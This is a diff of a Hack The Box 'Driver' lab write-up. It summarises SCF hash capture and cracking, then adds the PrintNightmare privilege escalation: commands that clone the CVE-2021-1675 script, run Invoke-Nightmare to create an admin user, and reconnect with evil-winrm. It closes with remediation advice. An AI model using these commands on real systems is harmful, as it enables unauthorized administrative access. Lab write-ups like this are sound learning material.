@@ -23,9 +23,9 @@ output: html_document
 **Ports/services exploited:** 80/http, 445/SMB\\
 **Tools:** autorecon, msfvenom, responder, hashcat, evil-winrm, winpeas\\
 **Techniques:** SCF (Shell Command Files) attacks\\
-**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, SCF, NTLV2, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution), Powershell, PrintNightmare
+**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, SCF, NTLV2, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution), Powershell, PrintNightmare, Invoke-Nightmare
 
-**TL;DR**: The host is running a web sever with an application that requires authentication. It appears to be a "MFP Firmware Update Center", and the default credentials admin/admin grant us access to the application, where it is possible to upload files. There's also SMB running, and this latter uses a dialect (NT LM 0.12) that is vulnerable to SCF. We can then create a SCF and upload it on the server. The user browsing to the share will trigger the execution of the SCF, resulting in him/her connecting to the share specified in the SCF. The tool *responder* can be used to capture the user's password hash. The hash can be cracked wiithin seconds, and we can then use the credentials with *evil-winrm* to get a PowerShell shell on the box. From there, enumeration reveals that *spoolsv* is listening, which is a service affected by many vulnerabilities known as *PrintNightmare*. 
+**TL;DR**: The host is running a web sever with an application that requires authentication. It appears to be a "MFP Firmware Update Center", and the default credentials admin/admin grant us access to the application, where it is possible to upload files. There's also SMB running, and this latter uses a dialect (NT LM 0.12) that is vulnerable to SCF. We can then create a SCF and upload it on the server. The user browsing to the share will trigger the execution of the SCF, resulting in him/her connecting to the share specified in the SCF. The tool *responder* can be used to capture the user's password hash. The hash can be cracked wiithin seconds, and we can then use the credentials with *evil-winrm* to get a PowerShell shell on the box. From there, enumeration reveals that *spoolsv* is listening, which is a service affected by many vulnerabilities known as *PrintNightmare*. One of them is exploited by a powershell script called *Invoke-Nightmare*, which allows us to add a user with admin privileges. Once this is done, we can use *evil-winrm* once eagain to connect with SYSTEM privileges.
 
 ## 1. Services enumeration
 {:style="color:DarkRed; font-size: 170%;"}
@@ -256,15 +256,38 @@ REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 After a moment of manual enumeration, I had to look for clues on the forum. Apparently, we have to look at *spoolsv*, which is a printer service. We could theoretically see it using the *Get-NetTCPConnection* cmdlet, but we don't have the permissions. It's the same for *netstat -a -b*, we get "*The requested operation requires elevation*" (note that it works without the *-b* flag, but we don't know what's listening in this case).\\
 Anyways, *winPEAS* should have revealed *spoolsv* on port 41410. From the internet, we learn that "*spoolsv.exe runs the Windows OS print spooler service. Any time you print something with Windows this important service caches the print job into memory so your printer can understand what to print*". 
 
-By searching for "print spooler service exploit", we see many promising results. Apparently, the class of vulnerabilities affecting the Windows print spooler is known as *PrintNightmare*
+By searching for "print spooler service exploit", we see many promising results. Apparently, the class of vulnerabilities affecting the Windows print spooler is known as *PrintNightmare*. There are RCE and/or privesc exploits, so let's look for a PE one. In <a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">this article</a>, the vulnerabilities are explained and there are steps and examples. From there, we see there's a privilege escalation powershell script called *Invoke-Nightmare*. We first have to download it on Kali, and then upload it with *evil-winrm*:
 
+````
+sudo git clone https://github.com/calebstewart/CVE-2021-1675
+# Upload the script on the target
+upload CVE-2021-1675.ps1
+`````
 
+When this is done, we can import the module and then use the *Invoke-Nightmare* command from that module to create a user admin with a chosen password:
 
+````
+Import-Module .\CVE-2021-1675.ps1
+Invoke-Nightmare -NewUser "netpal" -NewPassword "1234"
+`````
 
+We see in the image above that it was successful. The script used a malicious dll (*nightmare.dll*), but we don't necessarily have to understand how it works under the hood. We see it was indeed added to the administrators group:
 
+<div class="img_container">
+![ps1 exploit]({{https://jsom1.github.io/}}/_images/htb_driver_ps1.png)
+</div>
 
+We should now be able to use *evil-winrm* once again with those newly created credentials:
 
+````
+sudo evil-winrm -u netpal -p '1234' -i 10.10.11.106
+`````
 
+<div class="img_container">
+![root]({{https://jsom1.github.io/}}/_images/htb_driver_root.png)
+</div>
+
+Ad it worked!
 
 <div class="img_container">
 ![pwn]({{https://jsom1.github.io/}}/_images/htb_driver_pwn.png){: height="380px" width = 390px"}
@@ -273,11 +296,15 @@ By searching for "print spooler service exploit", we see many promising results.
 
 <ins>**My thoughts**</ins>
 
-Original box, long time no windows. 
-Interesting to see that printers can present a security risk if not properly secured or updated.
-2nd time I use autorecon, looks great but ton of information - easy to get lost. 
-Cracked the hash and used evil-winrm, but probably possible to get a meterpreter shell by using the relay exploit.
+It had been a long time since my last Windows box, and it felt great to do one again! I must say I didn't find it easy at all, and I'm a little bit concerned about the evolution of "easy" boxes on HtB.\\
+Anyways, I learned a lot, in particular regarding SCF and the *PrintNightmare* class of vulnerabilities. It was great to see a box about printers, and it's interesting to see that they can present a security risk if not properly secured or updated.
+
+I like using *autorecon* for the initial scan, but it takes a long time to run and I'm not used to it yet. The output is huge and I find it easy to get lost. I'll probably use a combination of *autorecon* and *nmap* from now on.
 
 <ins>**Fix the vulnerabilities**</ins>
 
+Regarding the file upload functionnality, the first and most obvious change to do is to change the default credentials on the firmware update center. By doing so, we couldn't upload the SCF payload and therefore wouldn't get in the way we did. Also, it could be a good idea to perform checks on the uploaded files (for example on file extensions, and so on).
 
+For the SCF vulnerability, there are at least 2 possible ways to fix it: by using Kerberos authentication and SMB signing, and/or by disallowing write permissions in file shares for unauthenticated users.
+
+Finally, privesc could be prevented by patching the vulnerability, or by disabling the print Spooler service momentarily if that can't be done rapidly. There's a patch that prevents exploitation by requiring administrator access to install printer driver (for example *nightmare.dll* in our case). There is also a new registry key, *RestrictDriverInstallationToAdministrators*, which will block all driver installation by non-administrator users.
